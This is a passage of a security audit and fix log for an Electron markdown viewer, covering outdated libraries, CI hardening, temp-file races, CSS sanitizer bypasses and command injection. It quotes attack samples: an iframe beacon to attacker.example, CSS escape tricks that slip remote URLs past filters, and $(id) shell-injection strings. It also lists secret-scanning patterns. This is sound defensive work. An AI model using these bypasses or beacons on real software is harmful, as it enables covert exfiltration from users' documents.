**Fix.** `JSON.stringify(tableData).replace(/</g, '\\u003c')`, the standard mitigation.

---

## SEC-16 — Pinned CDN library versions carry known published vulnerabilities

**Severity: Medium** · Category: SupplyChainAttack · Confidence 9/10 · Upstream

**Location:** `index.html:26-28`

The versions that actually execute are the CDN-pinned ones, **not** the (newer) ones in `node_modules` — so `npm audit` does not see them at all. This is a reporting blind spot worth calling out explicitly.

| Loaded (index.html) | Installed (`npm ls`) | Known issues in the loaded version |
|---|---|---|
| `dompurify@3.0.6` | 3.4.12 | **CVE-2024-45801** (prototype pollution bypassing depth checks) and **CVE-2024-47875** (nesting mXSS). Both affect `>=3.0.0 <3.1.3`; fixed in 3.1.3. |
| `mermaid@10.6.1` | 10.9.6 | Below the 10.9.6 / 11.15.0 fix line for the mermaid improper-sanitization and CSS-injection advisories (GHSA-87f9-hvmw-gh4p, GHSA-6m6c-36f7-fhxh). |
| `marked@9.1.6` | 9.1.6 | No advisory outstanding for 9.1.6, but v9 is long EOL (current is v16). |

A DOMPurify sanitizer bypass in this application is not "an XSS" — given SEC-08, it is RCE.

**Fix.** Load from `node_modules` (SEC-10) and bump `dompurify` to `^3.2.4+`, `mermaid` to `^11.15.0` (or `^10.9.6`), `marked` to a current major.

### FIXED

All four parts. `scripts/vendor-libs.js` copies the installed builds into `libs/vendor/` on
`postinstall` and `index.html` loads those, so the executing versions are the audited ones and
`npm audit` now sees what actually runs. The vendored set is DOMPurify 3.4.12 (above the 3.1.3
fix line for CVE-2024-45801 and CVE-2024-47875), Mermaid 11.16.0 (above 11.15.0) and
marked 18.0.9.

`libs/vendor/VERSIONS.json` is written by the same script from the resolved `package.json` of
each package, so the recorded versions cannot drift from the copied bytes, and
`test-packaging.js` fails if `THIRD-PARTY-NOTICES.md` no longer matches the installed tree.

The marked bump was taken on performance grounds as well as currency, and is measured rather
than assumed byte-safe: all seven benchmark corpus profiles render byte-identically under 9.1.6
and 18.0.9, all 267 corpus verification axes pass unchanged, and of 42 hand-written edge cases
only one differs (whitespace inside a raw HTML block). See `bench/BASELINE.md`.

---

## SEC-17 — Electron 37 has 17 published high-severity advisories

**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 9/10 · Upstream

**Location:** `package.json:41` (`"electron": "^37.0.0"`); resolved to `electron@37.10.3`

`npm audit` (run against the configured Microsoft proxy registry — the command succeeded) reports `electron <=39.8.4` as high severity with 17 advisories, including **GHSA-3c8v-cfp5-9885 — out-of-bounds read in second-instance IPC on macOS and Linux**, which is directly reachable here: `main.js:2318` registers a `second-instance` handler and `main.js:2327` feeds the attacker-influenced `commandLine` into `handleFileArgument`. Also relevant: GHSA-9wfr-w7mm-pc7f (renderer command-line switch injection) and GHSA-r5p7-gp4j-qhrx (incorrect origin passed to permission handler for iframe requests — pertinent given SEC-01).

**Fix.** Upgrade to Electron 41.7.1+. Note this is a major-version jump; the `enableRemoteModule` leftover at `main.js:131` suggests the codebase has not been reviewed against modern Electron in some time.

---

## SEC-18 — Build toolchain: critical `tar` advisory and 23 high-severity transitive vulnerabilities

**Severity: Medium** · Category: SupplyChainAttack · Confidence 9/10 · Upstream

**Location:** `package.json:42` (`electron-builder ^24.6.4`), `package.json:46` (`electron-updater ^6.1.7`)

`npm audit` summary: **24 vulnerabilities (23 high, 1 critical)**. Highlights:

* **`tar` (critical)** — 12 advisories including GHSA-34x7-hfp2-rc4v and GHSA-8qq5-rm4j-mr97 (arbitrary file write / symlink poisoning during extraction).
* **`builder-util-runtime <9.7.0` (high)** — **GHSA-p2f4-r6v6-j797**: `electron-updater` leaks `PRIVATE-TOKEN` and mixed-case `Authorization` credentials across a cross-origin redirect. `electron-updater` is a **runtime** dependency here (`main.js:63`), not just build tooling.
* **`app-builder-lib` (high)** — **GHSA-7g7r-gx96-252g**: uncontrolled search path elements in `AppImage` builds. The project ships AppImage (`package.json` `build.linux.target`), so this affects delivered artifacts.

`npm audit fix --force` would install `electron-builder@26.15.3` (breaking).

**Fix.** Upgrade `electron-builder` to 26.x and `electron-updater` to a version depending on `builder-util-runtime >=9.7.0`. These do not ship in the app bundle (except `electron-updater`), but they run in CI with `contents: write` permission.

---

## SEC-19 — Release workflow: unpinned third-party action and unpinned dependency install

**Severity: Medium** · Category: SupplyChainAttack · Confidence 8/10 · Upstream

**Location:** `.github/workflows/release.yml:87` and `.github/workflows/release.yml:29`

```yaml
# .github/workflows/release.yml:86-88
      - name: Create Release
        uses: softprops/action-gh-release@v1     # mutable tag, third-party namespace
```
```yaml
# .github/workflows/release.yml:28-29
      - name: Install dependencies
        run: npm install                         # not `npm ci`, lockfile not enforced
```

**Why it matters.** The workflow runs with `permissions: contents: write` (`.github/workflows/release.yml:9-10`) and publishes signed-by-nobody binaries to GitHub Releases. `softprops/action-gh-release` is a third-party action pinned to a **mutable** `v1` tag — whoever controls that repo (or a compromised maintainer account) can move the tag and gain write access to the release artifacts users download. `actions/checkout@v4`, `actions/setup-node@v4` and `actions/upload-artifact@v4` are in GitHub's official namespace and are acceptable per normal practice.

`npm install` (rather than `npm ci`) means `package-lock.json` is advisory only, so a compromised or typosquatted transitive dependency can be pulled into a release build.

Compounding this: `package.json` sets `"sign": null` (`build.win.sign`), so Windows releases are unsigned, and the app auto-updates from GitHub Releases via `electron-updater`.

**Fix.** Pin `softprops/action-gh-release` to a full commit SHA. Switch to `npm ci`. Consider code signing for release binaries.

### FIXED

`.github/workflows/release.yml` rewritten, plus a new `.github/dependabot.yml`.

| Change | Why |
|---|---|
| **Every** action pinned to a full commit SHA with a `# vX.Y.Z` comment | A tag is a mutable pointer. The audit called the `actions/*` namespace "acceptable per normal practice" — that judgement is withdrawn: after the 2025 `tj-actions/changed-files` compromise, pin-everything is the practice. The cost of pinning is staleness, which is why Dependabot lands in the same change. |
| `softprops/action-gh-release@v1` → SHA of **v3.0.2** | v1 is unmaintained and runs on a Node runtime GitHub has retired. `action.yml` at the pinned SHA was checked: `files`, `draft`, `prerelease` and the `GITHUB_TOKEN` env are all still there, so it is a drop-in. |
| `npm install` → `npm ci` | With `npm install` the lockfile is advisory, so a release build can pick up a transitive dependency nothing ever tested. Verified with `npm ci --dry-run`: the lockfile is in sync and the `postinstall` vendoring step still runs. |
| Top-level `permissions: contents: read`; `contents: write` moved onto the `create-release` job only | The build matrix ran the whole npm dependency tree with a token that could publish releases. Now nothing but the publish step can. |
| `persist-credentials: false` on checkout | The build jobs never push. Leaving the token in `.git/config` makes it readable by anything the build runs, including `postinstall` scripts. |
| `fail_on_unmatched_files: true` | A matrix leg producing nothing previously published a half-built release in silence. |
| `.github/dependabot.yml` added (github-actions + npm, weekly) | Pinning without automated bumps converts a supply-chain control into a permanently-vulnerable dependency. Dependabot rewrites the SHA *and* the version comment together. |

**A defect the audit missed, found while fixing this: the release workflow was
already broken and could not have produced a build.** It hard-coded
`node-version: 18`, while `package.json` declares `engines.node >= 22.12.0` and
`.npmrc` sets `engine-strict=true` — that combination makes `npm install` fail
outright with `EBADENGINE`. Now `node-version-file: '.nvmrc'`, so CI reads the
same version the project is developed against and cannot drift again. (Node 18
has also been end-of-life since April 2025.)

**Still open, deliberately.** `build.win.sign` is still `null`, so Windows
releases remain unsigned while `electron-updater` auto-updates from them.
Code signing needs a certificate and a secret store; it is a real gap and is
recorded here rather than quietly dropped.

**Also noted, out of scope here:** there is no CI workflow that *runs the tests*
— 421 assertions across 9 suites, and a release is cut with no gate at all.
Headless Electron on a Linux runner needs `xvfb` and is its own piece of work.

---

## SEC-20 — Predictable temp-file paths for generated HTML and the update batch script

**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 7/10 · Upstream

**Location:** `main.js:1080`, `main.js:1468`, `main.js:1598`, `main.js:1876`, `main.js:2484`

```js
const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-mermaid.html");   // main.js:1080
const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-omniware.html");  // main.js:1468
const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-image.html");     // main.js:1598
const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-table.html");     // main.js:1876
const batchPath    = path.join(os.tmpdir(), "omnicore-update.bat");          // main.js:2484
```

**Why it matters.** Fixed, guessable filenames in a shared temp directory. On Linux and macOS `os.tmpdir()` is world-writable `/tmp`, so an unprivileged local user (or another compromised process) can pre-create these paths as symlinks: `fs.writeFileSync` follows symlinks, giving arbitrary file write as the app's user (`main.js:1358`, `1529`, `1817`, `2166`). The window is wide — these files persist until the popup closes.

Worse, the ordering in `main.js:2484-2494` is create-then-execute:
```js
fs.writeFileSync(batchPath, batch, "utf8");
const { exec } = require("child_process");
exec(`start /min "" cmd /c "${batchPath}"`);
```
A local attacker who wins the race between the write and the `exec` gets code execution as the user. This particular one is Windows-only, where `os.tmpdir()` is per-user (`%LOCALAPPDATA%\Temp`), which substantially limits it.

Also note the temp files are only removed on the `closed` event — an app crash leaves attacker-derived HTML on disk.

**Fix.** Use `fs.mkdtempSync(path.join(os.tmpdir(), '<app>-'))` for a unique 0700 directory per invocation, and open with `flag: 'wx'` to fail on a pre-existing path.

> The vulnerable paths quoted above are reproduced **verbatim as they were at
> audit time**, when the app was named Omnicore Markdown Viewer. The 1.0 rename
> to Folia changed the prefix to `folia-`; the historical strings are left
> unedited because they are evidence, and `test-popup-security.js` still
> asserts against them to prove the old predictable paths cannot come back.

### FIXED

Two helpers in `main.js`, `writePopupDocument(kind, html)` and `removePopupDocument(tmp)`,
replace the five hand-rolled paths. Each popup document goes into its own
`mkdtempSync(path.join(os.tmpdir(), "folia-"))` directory — unpredictable name, mode
0700 — and is written with `{ flag: "wx", mode: 0o600 }`. The two controls are
complementary and both are needed:

- `mkdtemp` removes the *guessability*: an attacker cannot pre-plant a symlink at a path
  they cannot predict.
- `wx` removes the *consequence* if they somehow do: `open(O_EXCL)` refuses an existing
  path, symlink included, so the write errors rather than being redirected.

`removePopupDocument` unlinks the file and then removes the directory, so a crash leaves at
most one empty directory rather than attacker-derived HTML.

The portable-update batch script got the same treatment, plus two further changes:
`exec()` with the path interpolated into a shell string became `spawn("cmd.exe", ["/c",
batchPath])` with an argv array, and the batch now deletes itself on completion instead of
being left behind. **Caveat:** this path only runs for a portable Windows install and could
not be executed end-to-end; it is syntax-checked and reviewed only.

**A functional bug fell out of the same change.** All popups of a given kind shared one
filename. Opening two mermaid popups meant the second overwrote the first's document, and
whichever closed first deleted the file out from under the other. That was a plain
user-visible bug sitting inside the security finding, and it now has its own assertion.

**Proof (R40, R41).** Restoring the fixed path fails four of the five SEC-20 assertions —
the fifth is a control asserting that `wx` really does refuse an existing path, which is a
property of `fs`, not of this code, so it correctly stays green.

R41 was needed because the first version of the "not at the old path" assertion compared
`path.dirname()` (forward slashes, from a `file://` URL) against `os.tmpdir()`
(backslashes, on Windows). Those two strings are *never* equal, so that clause asserted
nothing. It now compares via `path.resolve()` case-insensitively, and R41 — a revert that
keeps a unique filename but puts it back in the shared temp root — confirms the repaired
clause actually fails.

---

## SEC-21 — `<iframe src>` and inline `style` are explicitly re-enabled in the sanitizer

**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream

**Location:** `renderer.js:3155-3158` and `renderer.js:3028-3031`

```js
html = DOMPurify.sanitize(html, {
  ADD_TAGS: ['iframe', 'style'],
  ADD_ATTR: ['target', 'style', 'class', 'id', 'data-note-id', ...]
});
```

**Why it matters.** DOMPurify forbids `iframe` and `style` by default for good reason; both are re-enabled here. I verified `srcdoc` is **not** in DOMPurify's attribute allowlist (grepped `node_modules/dompurify/dist/purify.js` — the only `srcdoc` occurrence is in a comment at line 654), so direct `<iframe srcdoc>` from markdown *is* stripped. But `src` is allowed, so:

```markdown
<iframe src="https://attacker.example/track?doc=confidential"></iframe>
```

survives sanitization and loads remote attacker content inside the application, with no CSP to stop it (SEC-09). Consequences: silent read-receipt/beaconing on every document open, remote-controlled phishing UI rendered inside a trusted-looking app window, and the user-gesture `top.location` navigation chain described in SEC-11.

`ADD_TAGS: ['style']` plus `ADD_ATTR: ['style']` additionally permits CSS injection — arbitrary `background-image: url(https://attacker/...)` exfiltration channels and full-window UI redressing over the app chrome.

**Fix.** Drop `iframe` from `ADD_TAGS` (it exists only to support the `@@@html` feature, which should be removed per SEC-01). If `style` must stay, constrain it via DOMPurify hooks or a CSS allowlist.

### FIXED — both halves, and the second half was the harder one

**`<iframe src>`** is removed in the `afterSanitizeAttributes` hook (done under SEC-11).
The tag itself stays, because `@@@html` is built from `srcdoc`; only the attribute goes.

**`style` was kept deliberately.** Dropping it from the allowlist is not available: the
notes feature colours entries with inline styles, the theme system writes them, and
upstream markdown uses them. So rather than remove the attribute, the fix removes what
made it dangerous — the ability to name a remote resource:

- `url()`, `image-set()` / `-webkit-image-set()` and `@import` are all filtered.
  `image-set()` and `@import` matter because **neither needs a `url()` wrapper**; filtering
  only `url()` would have left two open doors.
- A value is kept only if it is a relative path, a local drive path (reusing the SEC-12
  `isLocalImagePath` check, so a UNC path smuggled in behind a local-looking prefix is
  still refused), or an inert `data:image/…`. **SVG is excluded** from that data: allowlist:
  a data: SVG is a document that can carry script, not just pixels.
- Everything else is rewritten to `url("about:blank")` rather than deleted, so the
  surrounding declaration survives and the rest of the element still styles correctly.
  There is an explicit assertion for that, because a fix that quietly nuked the whole
  attribute would be indistinguishable from removing `style` from the allowlist.
- Values are **CSS-unescaped before being judged**. This is load-bearing: CSS permits
  `\68 ttps:` for `https:`, and testing the raw text catches nothing.

**Why the CSP does not already cover this.** `img-src https:` is deliberately open so that
ordinary documents can display remote images. That is precisely the directive a
`background-image: url(https://attacker/?doc=…)` beacon needs. No click, no script, fires
on every render of the document.

**A bug found by the test, in the fix itself.** The first version of the unquoted-`url()`
tokenizer used `[^)\s]`, which stops at whitespace. But a CSS hex escape is *terminated* by
a space — `url(\68 ttps://evil/)` is one token containing a space. The pattern therefore
failed to match at all and the value passed through completely unfiltered. The escape
assertion caught it; the tokenizer now treats a hex escape as a single unit.

**Proof (R42).** Replacing `sanitizeCssText(raw)` with `raw` at both call sites fails
exactly the five blocking assertions — style attribute, CSS escape, protocol-relative,
`image-set()`, `<style>` element — while the three "legitimate CSS survives" controls stay
green, which is the correct signature for a control that only removes things.

### The first version of this filter was broken, and dual review found it

The regex filter above passed its own tests and was committed. Two independent reviews then
found **three separate bypass classes**, none of which the tests covered. Each was confirmed
live against Chromium — the engine really does resolve them into a network fetch — before
being fixed:

| # | Payload | Why the regex missed it | Found by |
|---|---|---|---|
| 1 | `url("ht\`<LF>`tps://evil/")` | A backslash-newline inside a CSS string is a **line continuation**: it is consumed and produces nothing (CSS Syntax L3 §4.3.5). The engine sees `https:`; the regex saw `ht\<LF>tps` with no scheme and classed it "relative, therefore safe". | Opus |
| 2 | `\75rl(…)`, `\69mage-set(…)`, `@im\70ort` | Escapes were decoded inside the *value* but the filter still matched the **identifier** by literal text. The identifier can be escaped too. | Codex |
| 3 | `<svg><style>…</style></svg>` | The `<style>` branch tested `tagName === 'STYLE'`. `tagName` is upper-cased only for HTML-namespace elements; an SVG `<style>` reports lower-case `style`, so SVG stylesheets were skipped **entirely**. DOMPurify keeps SVG by default. | Opus |

**The lesson is structural, not three separate patches.** All three are the same failure:
a hand-written tokenizer disagreeing with the engine that will actually parse the string.
Patching three regexes would leave the fourth unfound. So the filter now **delegates
tokenizing to Chromium** and filters the canonical result:

- A style attribute is assigned to a detached element's `style.cssText` and read back.
  Escapes are resolved, `image-set("x")` becomes `image-set(url("x"))`, quoting is
  normalised, and unparseable declarations are dropped exactly as they would be at render
  time. `\75rl(//evil/)` comes back as `url("//evil/")` — which the existing check then
  rejects.
- A `<style>` element's text goes through `new CSSStyleSheet()` + `replaceSync()`.
  `replaceSync` ignores `@import` **by specification**, which disposes of every escaped
  spelling (`@\69mport`, `@im\70ort`, `@IMPORT`) without enumerating any of them.
- Both probes are detached and never adopted into the document, so parsing them fetches
  nothing. Verified.

**The regex pass is still there, and still necessary.** Measured: Chromium does **not**
canonicalise CSS custom properties — they are stored as raw token streams. `--evil:
url("ht\<LF>tps://evil/")` survives normalisation verbatim, and `background-image:
var(--evil)` then resolves it to a live URL (confirmed via `getComputedStyle`). Neither
reviewer raised this; it turned up while probing the engine's actual behaviour rather than
reasoning about it. So normalisation handles the standard declarations and the (now
line-continuation-aware) regex handles what normalisation leaves raw.

**Proof (R43).** Reverting `renderer.js` to the first committed version fails six of the
seven new assertions. The seventh — a `style` attribute on an SVG *element* — passes either
way, because attribute handling was never namespace-sensitive; it is kept as coverage
against a future regression, not claimed as a proof.

**Method note.** The bypasses were not found by reading the regexes, and would not have been.
They were found by executing candidate payloads against Chromium and comparing what the
engine resolved against what the filter believed. Any future change here should be validated
the same way.

---

## SEC-22 — Command injection surface in `exec()` on the WSL export path

**Severity: Low** · Category: StringInjection · Confidence 6/10 · Upstream

**Location:** `main.js:541-549`

```js
function openFileAfterExport(filePath) {
  if (process.platform === "linux") {
    exec(`wslpath -w "${filePath}"`, (err, winPath) => {
      if (!err && winPath && winPath.trim()) {
        exec(`explorer.exe "${winPath.trim()}"`, (err2) => { ... });
```

**Why it is only Low.** `filePath` is interpolated into a shell command inside double quotes, where `$`, `` ` `` and `\` remain active — a path containing `` `id` `` or `$(id)` would execute. However `filePath` originates from `dialog.showSaveDialog()` (`main.js:635`, `690`, `1409`, `1544`), so the user must type the malicious path themselves. The `defaultPath` *is* derived from the document filename (`main.js:601-604`, `659-663`), which an attacker can influence, but the user must still accept the dialog, and native save dialogs generally reject shell metacharacters in the filename field. I could not construct a realistic end-to-end attack — reported as a code-quality-adjacent security defect rather than an exploitable bug.

**Fix.** Use `execFile('wslpath', ['-w', filePath])`, which bypasses the shell entirely.

### FIXED — with an honest caveat about verification

Both calls now use `execFile` with an argument vector, and the `{ exec }` import was
replaced with `{ execFile }` so the shell-invoking form is no longer even in scope in
`main.js`.

**This could not be executed end-to-end.** The branch is guarded by
`process.platform === "linux"` and the development machine is Windows, so no test in the
suite reaches it. It is syntax-checked and reviewed, not run — recorded here rather than
counted as verified, the same way the portable-update batch rewrite under SEC-20 is.

---

## SEC-23 — `postMessage` handler accepts messages from any origin

**Severity: Low** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream

**Location:** `renderer.js:~3245` (the raw-HTML resize listener, since renamed to
`folia-rawhtml-resize` by the 1.0 rebrand; quoted below as it stood at audit time)

```js
window.addEventListener('message', function(e) {
  if (!e.data || e.data.type !== 'omnicore-rawhtml-resize') return;
  const iframe = viewer.querySelector(`iframe[data-rawhtml-idx="${e.data.idx}"]`);
  if (iframe && e.data.h > 0) iframe.style.height = e.data.h + 'px';
});
```

No `e.origin` or `e.source` check. Any frame — including a remote `<iframe src>` admitted by SEC-21 — can post this message. The impact is limited to setting an iframe's CSS height (`e.data.idx` is only used inside an attribute selector, and `e.data.h` is concatenated into a `style.height` property assignment, not into HTML, so neither is an injection sink). Reported for completeness and because it is trivially fixable.

**Fix.** Validate `e.source` against the known iframe's `contentWindow` and coerce `e.data.h` with `Number()`.

---

## SEC-24 — Session persistence re-arms malicious documents on every launch *(fork-introduced)*

**Severity: Low** · Category: SecurityMisconfiguration · Confidence 8/10 · **Fork-specific** (`custom-tabs.js`)

**Location:** `custom-tabs.js:620-623` (save), `custom-tabs.js:629-672` (restore), `custom-tabs.js:111` (re-read from disk)

```js
localStorage.setItem("openTabs", JSON.stringify(tabsData));       // custom-tabs.js:620
localStorage.setItem("activeTabPath", activeTab ? activeTab.filePath : "");
...
if (window.fs.existsSync(tabData.filePath)) { ... }               // custom-tabs.js:640
```

This is not a vulnerability on its own — the tab feature is well-implemented and contains no injection sinks. But it changes the risk profile of every finding above: a malicious document opened once is silently reopened and re-rendered on every subsequent launch, converting one-shot payloads into persistence, and re-reading from disk (`custom-tabs.js:111`) means the attacker can swap the file contents between sessions.

Worth noting explicitly in the fork's README once the Critical findings are fixed; not worth fixing in isolation.

**Fix.** Optional: cap restored tabs, or prompt before restoring a session on first launch.

---

## SEC-25 — `marked` `sanitize: false` is a removed, no-op option

**Severity: Info** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream

**Location:** `renderer.js:33-39`

```js
marked.setOptions({
  breaks: true, gfm: true, headerIds: true, mangle: false,
  sanitize: false
});
```

`sanitize` was deprecated in marked v0.7 and **removed in v5**; the app was running marked 9.1.6 when this was found, so this key was silently ignored. The good news: it is set to `false`, meaning the code is *not* relying on it — DOMPurify is the actual control. Flagged only because a reader (or a future maintainer) may believe a sanitizer setting is in force here when none is. Setting it to `true` would not help either — it would still be ignored.

**Fix.** Delete the dead option and add a comment stating that DOMPurify is the sole sanitization boundary.

### FIXED

The key is deleted and replaced with a comment naming DOMPurify (`SANITIZE_CONFIG`) as the
only sanitization boundary in the pipeline, and noting that setting `sanitize: true` here
would not create one. Nothing behavioural changed, so this deliberately carries no
regression test — an assertion that a removed option is still removed would only restate
the diff.

---

## SEC-26 — Sanitization is not the last step in the pipeline (root cause)

**Severity: Info (architectural)** · Confidence 10/10 · Upstream

**Location:** `renderer.js:3151-3234` vs `renderer.js:2996-3039`

Worth recording separately because it is the single root cause behind SEC-02, SEC-03 and SEC-04, and because the two render paths **disagree with each other**:

* **Full render** (`renderMarkdownFull`): `DOMPurify.sanitize` at `renderer.js:3155`, then slider/mermaid/omniware/iframe splicing at `3168`, `3193`, `3200`, `3229`, then `patchViewerDOM` at `3234`. → **vulnerable**
* **Light-format render** (`renderLightFormat`): mermaid splicing at `2996` and iframe splicing at `3016`, **then** `DOMPurify.sanitize` at `3028`, then `patchViewerDOM` at `3039`. → mostly safe (the `srcdoc` attribute is stripped, so `@@@html` renders as an empty iframe)

The correct ordering already exists in the codebase; it is simply not used on the path that matters. Any fix should converge both paths on *parse → assemble → sanitize → insert*.

---

## Coverage: what I checked and found SAFE

Recorded so a reader knows where the audit's boundaries are.

**Mermaid configuration — safe.** `mermaid-config.js:47-56` (`getMermaidConfig`) sets only `startOnLoad`, `theme` and `themeVariables`. **`securityLevel` is never set**, so mermaid 10.x defaults to `'strict'`, which enables mermaid's internal DOMPurify pass on labels and disables click/callback interaction. I grepped the whole repo for `securityLevel` and `'loose'` — no occurrences. The single `mermaid.initialize()` call site is `renderer.js:25-28`. This is genuinely the correct default and is the reason SEC-07 is High rather than Critical.

**`webSecurity` / `allowRunningInsecureContent` — safe.** Neither appears in any `webPreferences` block in `main.js` (grepped). Both retain their secure defaults (`webSecurity: true`, `allowRunningInsecureContent: false`). No `webview` tag is used anywhere; no `BrowserView` is created.

**Table popup window — correctly hardened.** `main.js:1865-1868` sets `nodeIntegration: false, contextIsolation: true`. This is the only popup that does so, and it is why SEC-15 is Medium and contained rather than Critical.

**No hardcoded secrets.** Grepped all `*.js`, `*.json`, `*.yml`, `*.bat`, `*.sh`, `*.md`, `*.html` outside `node_modules`/`libs` for `ghp_`, `github_pat_`, `AKIA`, `-----BEGIN`, and `api_key`/`secret`/`password`/`token` assignment patterns — **zero matches**. `.github/workflows/release.yml` correctly uses `${{ secrets.GITHUB_TOKEN }}`. (`.claude/settings.local.json` existed at audit time and contained only tool permissions, no credentials; it has since been deleted along with `.cursor/rules/`.)

**Full IPC surface enumerated — no privilege escalation beyond what the renderer already holds.** All 31 handlers reviewed: `main.js:470, 475, 519, 529, 597, 655, 720, 827, 928, 984, 989, 994, 999, 1007, 1022, 1060, 1427, 1435, 1565, 1579, 1827, 1856, 2266, 2430, 2433, 2436, 2444, 2469, 2476`. Several accept renderer-supplied paths with no validation — `save-markdown-file` (`main.js:928`) writes any path, `reload-file` (`main.js:1022`) reads any path, `start-file-watching` (`main.js:984`) and `set-active-file` (`main.js:1007`) watch any path, `open-folder-in-explorer` (`main.js:529`) calls `shell.showItemInFolder` on any path. **This is not an escalation** in the current architecture, because the renderer already has unrestricted `fs` and `shell` via `nodeIntegration: true` (`renderer.js:4-6`). It *does* become a real path-traversal/arbitrary-write vulnerability class the moment SEC-08 is fixed — so path validation must be added **as part of** that refactor, not after it. There is no IPC channel that accepts a shell command or a module name.

**`handleFileArgument` and file associations — safe.** `main.js:2185-2246`: skips `--`-prefixed flags, requires `fs.existsSync(arg)`, and enforces an extension allowlist (`.md .markdown .mdown .mkd .mkdn .mmd .mermaid .ow`). It cannot be coerced into reading an arbitrary path or executing anything. The macOS `open-file` handler (`main.js:2248-2264`) and the `second-instance` handler (`main.js:2318-2352`) route through the renderer's unsaved-changes check. **No custom protocol handler is registered** — no `app.setAsDefaultProtocolClient`, no `protocol.registerSchemesAsPrivileged`, no `protocols` key in the electron-builder config. There is therefore **no deep-link attack surface**, which meaningfully limits remote (as opposed to file-borne) triggering.

**`shell.openExternal` — correctly restricted.** `renderer.js:1376-1381` gates it behind `url.startsWith('http://') || url.startsWith('https://')` on the *resolved absolute* `link.href`, so `javascript:`, `file:`, `smb:`, `ms-msdt:` and other dangerous schemes cannot reach it via this path. DOMPurify independently strips `javascript:` and non-allowlisted schemes from `href`. The other call site (`renderer.js:1316`) is a hardcoded constant. I specifically looked for a scheme-confusion bypass here and did not find one.

**DOMPurify default protections still intact for the tags/attrs not overridden.** Verified against the bundled `node_modules/dompurify/dist/purify.js`: `srcdoc` is not in the attribute allowlist (line 654 is a comment only); `IS_ALLOWED_URI` (the sealed regex) permits only `http(s)`, `ftp(s)`, `mailto`, `tel`, `callto`, `sms`, `cid`, `xmpp`, `matrix` plus scheme-less values — `file:`, `javascript:` and `data:` in `href` are rejected. `<script>`, `<meta>` and `<base>` are not in the default tag allowlist and are not added.

**Note title/content escaping — safe.** `renderer.js:5586-5587` and `renderer.js:2452-2453` correctly escape `<`/`>` before interpolating into element text positions. Only the adjacent `noteId` was missed (SEC-13).

**Table of contents — safe.** `renderer.js:2296` uses `item.textContent = header.textContent`, not `innerHTML`.

**Tab rendering — safe.** `custom-tabs.js:392-394` uses `textContent` for both the tab title and its tooltip. `custom-tabs.js:399` and `custom-tabs.js:582` assign only static SVG/welcome-screen literals. Same for `custom-theme.js:64` and `custom-language.js:221` (static SVG + a label from a hardcoded string table) and `custom-collapse.js:80,91`. *(`custom-language.js` has since been deleted along with the interface-language switcher, so that sink no longer exists at all.)*

**No `eval` / `new Function` in first-party code.** Grepped all root-level `*.js` — zero matches.

**PrismJS is loaded from disk, not a CDN.** `index.html:30` → `libs/prismjs/prism-bundle.js`. I checked the bundle for a live autoloader base path (`cdnjs`, `jsdelivr`, `languages_path`) — the only URL hits are license headers, comments and documentation links. The `prism-autoloader` component present under `libs/prismjs/components/` is not the file being loaded. This is the pattern the other three libraries should follow (SEC-10).

**`npm audit` clean for the runtime rendering dependencies.** No advisories against `marked`, `mermaid`, `dompurify`, `prismjs`, `html2canvas` or `html-to-docx` as installed at the time of the audit. (Caveat: this does **not** cover the older CDN-pinned versions that actually execute — see SEC-16.) The audit command ran successfully against the configured proxy registry; no network failures were encountered and no results are guessed. *(`html-to-docx` and `html2canvas` have since been uninstalled along with the Word export and the html2canvas rasteriser, so neither is in the dependency tree any more; `electron-updater` is now the only production dependency.)*

**No telemetry or analytics.** No `fetch`, `XMLHttpRequest`, `axios`, or `http.request` to any endpoint in first-party code. The only outbound network activity is the CDN/font loads in `index.html` (SEC-10) and `electron-updater`'s GitHub Releases check (`main.js:2444-2467`), which is gated on `app.isPackaged`.

**Removed from scope by deletion.** The `vscode-extension/` sub-project (~10 TypeScript source files plus a bundled webview under `vscode-extension/media/`) was a separate deliverable with a different threat model, was never part of the Electron app's `build.files` list, and never shipped in the desktop artifact. This audit flagged that `vscode-extension/media/webview/mermaid-config.js` and `omniware-config.js` were copies of the vulnerable root files, so **SEC-04 and the mermaid handling likely reproduced there**, and that it warranted its own pass before publication. That pass is now moot: the whole sub-project has been dropped from the fork, taking the duplicated copies with it. The one thing it uniquely owned — the FiraCode TTFs consumed by `styles.css` — was relocated to the tracked `assets/fonts/` first.

---

## Recommended remediation order

1. **SEC-26 / SEC-02 / SEC-03 / SEC-04** — make DOMPurify the last step before DOM insertion, and escape the three post-sanitization interpolation sites. Highest value per line changed; kills three zero-click RCEs.
2. **SEC-01** — remove `@@@html`, or add `sandbox="allow-scripts"` (no `allow-same-origin`).
3. **SEC-05 / SEC-06 / SEC-07** — escape the popup interpolations and flip those three windows to `nodeIntegration: false`.
4. **SEC-11 / SEC-09** — add `will-navigate` + `setWindowOpenHandler` guards and a CSP. **SEC-11 done (popups and main window); SEC-09 done for popups, main-window CSP still open.**
5. **SEC-10 / SEC-16** — move marked/mermaid/DOMPurify to local files and bump versions.
6. **SEC-12 / SEC-13 / SEC-14 / SEC-15** — the remaining injection and one-click-execution fixes. **Done.**
7. **SEC-08** — the `contextIsolation: true` + preload refactor. Largest effort; do it last, but note that until it lands, every other fix is a single missed escape away from RCE. Path validation on the IPC handlers must land together with this.
8. **SEC-17 / SEC-18 / SEC-19** — dependency and CI hardening.